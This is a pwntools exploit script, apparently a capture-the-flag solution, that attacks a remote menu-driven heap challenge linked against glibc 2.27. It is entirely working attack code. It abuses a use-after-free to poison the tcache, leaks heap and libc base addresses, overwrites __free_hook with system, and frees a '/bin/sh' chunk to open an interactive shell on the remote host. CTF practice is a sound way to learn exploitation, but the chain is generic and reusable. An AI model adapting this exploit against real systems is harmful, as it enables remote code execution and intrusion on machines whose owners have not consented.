from pwn import *
context(arch = 'amd64', os = 'linux')
#context.log_level = 'debug'

#io = process("./pwn")
io = remote('node4.anna.nssctf.cn', 28394)
elf = ELF("./pwn")
#libc = elf.libc
libc = ELF("../silverwolf/libc-2.27.so")

def debug():
	gdb.attach(io)
	pause()

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte = lambda n    : str(n).encode()
sh   = lambda      : io.interactive()


menu = b'Your choice: '
def add(size):
	sla(menu, b'1')
	sla(b'Index: ', b'0')
	sla(b'Size: ', byte(size))

def edit(content):
	sla(menu, b'2')
	sla(b'Index: ', b'0')
	sla(b'Content: ', content)

def show():
	sla(menu, b'3')
	sla(b'Index: ', b'0')

def dele():
	sla(menu, b'4')
	sla(b'Index: ', b'0')

add(0x78)
dele()
edit(b'\x00'*0x10)
dele()
show()
rut(b'Content: ')
heap_base = addr(b'\n') - 0x260
print("heap_base : ", hex(heap_base))

edit(p64(heap_base+0x10))
add(0x78)
add(0x78)
payload = p64(0)*4 + b'\x00\x00\x00\xff'
edit(payload)
dele()
show()

rut(b'Content: ')
libc.address = addr(b'\n') - 96 - 0x10 - libc.symbols['__malloc_hook']
print("libc_base : ", hex(libc.address))

system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']
print("system : ", hex(system))
print("free_hook : ", hex(free_hook))

add(0x60)
edit(b'\x00\x00\x00\x00\x00\x01')
dele()
edit(p64(free_hook-8))
add(0x60)
add(0x60)
payload = b'/bin/sh\x00' + p64(system)
edit(payload)

dele()

#debug()
sh()
